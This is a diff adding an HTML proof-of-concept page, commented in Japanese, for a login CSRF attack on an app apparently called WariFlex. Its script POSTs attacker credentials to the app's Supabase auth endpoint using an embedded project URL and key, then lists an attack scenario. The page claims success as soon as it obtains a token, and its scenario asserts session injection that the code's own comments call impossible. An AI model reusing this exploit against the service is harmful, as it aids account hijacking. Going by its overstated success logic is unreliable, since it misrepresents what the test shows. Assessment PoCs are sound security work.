@@ -1,0 +1,62 @@
+<!--
+  WariFlex ログインCSRF PoC (Proof of Concept)
+  ==============================================
+  このHTMLを攻撃者のサーバーに設置し、被害者にアクセスさせると、
+  被害者のブラウザで攻撃者のアカウントにログインさせることができる。
+
+  ※ 診断目的のPoC。悪用厳禁。
+-->
+
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login CSRF PoC</title>
+</head>
+<body>
+<h1>WariFlex Login CSRF PoC</h1>
+<p>このページを開くと、攻撃者のアカウントで自動ログインを試みます。</p>
+<script>
+// 攻撃者のアカウント情報
+const SUPABASE_URL = 'https://yvhohzzcwpfdxahqpdtf.supabase.co';
+const ANON_KEY = 'sb_publishable_d_33Z6FQG6v1Z2fxBDCcAw_bkKVZmyE';
+
+// CSRFトークンなし・Origin検証なしでログイン可能
+fetch(`${SUPABASE_URL}/auth/v1/token?grant_type=password`, {
+  method: 'POST',
+  headers: {
+    'apikey': ANON_KEY,
+    'Content-Type': 'application/json'
+  },
+  body: JSON.stringify({
+    email: 'attacker@example.com',
+    password: 'AttackerPass123'
+  })
+})
+.then(r => r.json())
+.then(data => {
+  if (data.access_token) {
+    // 被害者のブラウザのlocalStorageに攻撃者のセッションを注入
+    // (同一オリジンでない場合はlocalStorage書き込みは不可だが、
+    //  SupabaseのCORSが * なのでAPIレスポンスは取得可能)
+    document.getElementById('result').textContent =
+      'Login CSRF 成功: access_token を取得しました';
+  }
+})
+.catch(e => {
+  document.getElementById('result').textContent = 'Failed: ' + e;
+});
+</script>
+<pre id="result">テスト中...</pre>
+<hr>
+<h2>攻撃シナリオ</h2>
+<ol>
+  <li>攻撃者がこのHTMLを自分のサーバーに設置</li>
+  <li>被害者がこのページにアクセス</li>
+  <li>被害者のブラウザからSupabase APIへログインリクエストが送信される</li>
+  <li>CORSが * なのでレスポンスを読み取り可能</li>
+  <li>攻撃者のセッションを被害者のブラウザに注入可能</li>
+</ol>
+</body>
+</html>
